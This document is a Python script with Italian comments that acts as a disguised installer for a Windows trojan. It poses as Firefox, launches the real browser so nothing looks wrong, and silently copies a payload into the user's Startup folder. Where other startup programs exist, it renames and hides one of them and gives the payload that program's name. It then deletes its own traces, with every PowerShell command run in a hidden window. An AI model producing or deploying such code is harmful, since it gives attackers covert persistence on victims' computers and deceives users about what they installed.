import subprocess, os

#PROVEREMO A VEDERE SE C'È ALMENO UN PROGRAMMA GIÀ PRESENTE IN STARTUP
#IN CASO POSITIVO VERRANNO ESEGUITE LE SEGUENTI OPERAZIONI:
#RENAME DEL PROGRAMMA AGGIUNGENDO HOOKED_ COME PREFISSO
#CREIAMO UN FILE CHE CONTIENE PREFISSO+NOMEPROGRAMMA
#NASCONDIAMO IL PROGRAMMA TROVATO E IL FILE CREATO
#RENAME DEL NOSTRO PROGRAMMA CON IL NOME DEL PROGRAMMA TROVATO
#IL NOSTRO PROGRAMMA È COSÌ MASCHERATO, LEGGENDO IL FILE CREATO POTRÀ COMUNQUE LANCIARE
#IL PROGRAMMA CHE HA "SOSTITUITO"
fileName = "exeName.txt"
startUpPath = os.path.expanduser('~')+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
filePath = f"{startUpPath}\\{fileName}"

def maskExeFile():
    global fileName, startUpPath, filePath
    programs = os.listdir(startUpPath)
    if len(programs) > 1:
        target = programs[1]
    else:
        return False

    with open(filePath, "w", encoding = "utf-8") as f:
        f.write(f"hooked_{target}")

    subprocess.run(f"powershell attrib +h '{filePath}'", stdout = subprocess.DEVNULL, shell = False, creationflags = CREATE_NO_WINDOW)

    return True

CREATE_NO_WINDOW = 0x08000000 #FLAG CHE EVITA CHE SI APRA IL TERMINALE

#SPECIFICARE IL NOME DI QUESTO ESEGUIBILE
selfName = "fake.exe"
#IL NOME DELL'ESEGUIBILE DA INSTALLARE
fakeExecName = "script.exe"
#NOME DEL VERO ESEGUIBILE 
realExecName = "Real_Firefox.exe" 
#QUESTA VARIABILE CONTIENE, IN CASO CI SIANO ALTRI PROGRAMMI CHE PARTONO ALL'AVVIO, IL NOME CON CUI MASCHEREREMO L'ESEGUIBILE DA INSTALLARE
maskedExecName = fakeExecName


#VERIFICHIAMO SE CI SONO ALTRI PROGRAMMI CHE PARTONO ALL'AVVIO NELLA CARTELLA STARTUP
#IN CASO CI SIANO, MASCHERIAMO IL NOSTRO ESEGUIBILE FACENDO FINTA SIA UNO DI QUELLI
if maskExeFile():
    with open(filePath, "r", encoding = "utf-8") as f:
        target = f.read().split("_")[1]
    exe = target.split(".")[0]+".exe"
    subprocess.run(f"powershell Rename-Item '{startUpPath}\\{target}' '{startUpPath}\\hooked_{target}'", stdout = subprocess.DEVNULL, shell = False, creationflags = CREATE_NO_WINDOW)
    subprocess.run(f"powershell attrib +h '{startUpPath}\\hooked_{target}'", stdout = subprocess.DEVNULL, shell = False, creationflags = CREATE_NO_WINDOW)
    subprocess.run(f"powershell Rename-Item '{fakeExecName}' '{exe}'", stdout = subprocess.DEVNULL, shell = False, creationflags = CREATE_NO_WINDOW)
    maskedExecName = exe


#COPIA L'ESEGUIBILE DA INSTALLARE NEI PROGRAMMI DI AVVIO
subprocess.run(f"powershell -windowstyle hidden copy '.\{maskedExecName}' $env:APPDATA'\Microsoft\Windows\Start Menu\Programs\Startup'", stdout = subprocess.DEVNULL, shell = False, creationflags = CREATE_NO_WINDOW)
#LANCIA L'ESEGUIBILE VERO DEL PROGRAMMA
subprocess.run(f"powershell -windowstyle hidden start '{realExecName}'", stdout = subprocess.DEVNULL, shell = False, creationflags = CREATE_NO_WINDOW)
#ELIMINA QUESTO PROGRAMMA
subprocess.run(f"powershell rm '{selfName}'", stdout = subprocess.DEVNULL, shell = False, creationflags = CREATE_NO_WINDOW)
#ELIMINA IL PROGRAMMA CHE ABBIAMO INSTALLATO DAL PERCORSO IN CUI CI TROVIAMO
subprocess.run(f"powershell rm '{maskedExecName}'", stdout = subprocess.DEVNULL, shell = False, creationflags = CREATE_NO_WINDOW)
#RINOMINA IL VERO ESEGUIBILE DEL PROGRAMMA, ALL'ATTO PRATICO QUESTO FILE VIENE CANCELLATO E SOSTITUITO DAL VERO ESEGUIBILE
subprocess.run(f"powershell Rename-Item '{realExecName}' '{selfName}'", stdout = subprocess.DEVNULL, shell = False, creationflags = CREATE_NO_WINDOW)